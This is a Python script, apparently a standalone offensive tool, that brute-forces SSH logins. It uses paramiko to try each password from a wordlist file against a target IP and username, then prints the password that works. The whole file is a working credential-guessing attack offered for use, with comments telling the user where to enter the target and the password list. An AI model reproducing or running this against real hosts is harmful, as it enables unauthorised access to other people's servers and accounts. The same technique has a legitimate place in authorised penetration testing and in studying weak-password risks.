####################
#Brute Force SSH creds
#
#This script will require a target IP, username, and password list. 
#This script will need root privileges to run successfully.
####################

import paramiko
host = "target_ip" # enter target IP address here.
user = "username" # Enter the username to brute force the password.
def sshbrute(loginPass): 
    with paramiko.SSHClient() as client:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, username=user, password=loginPass, timeout=5)
            return loginPass  # Return the password if successfully connected
        except Exception:
            pass
 
loginPasslist = []
with open("pass.txt", "r") as f:    #replace your "pass.txt" with your password list.
    loginPasslist = [line.strip() for line in f.readlines()]

print(f"Brute forcing the ssh service at {host} now...")
for passwd in loginPasslist:
    found_password = sshbrute(passwd)
    if found_password:
        print(f"The password for the user {user} at ip {host} is: {found_password}")
        break
else:
    print("Password not found.")
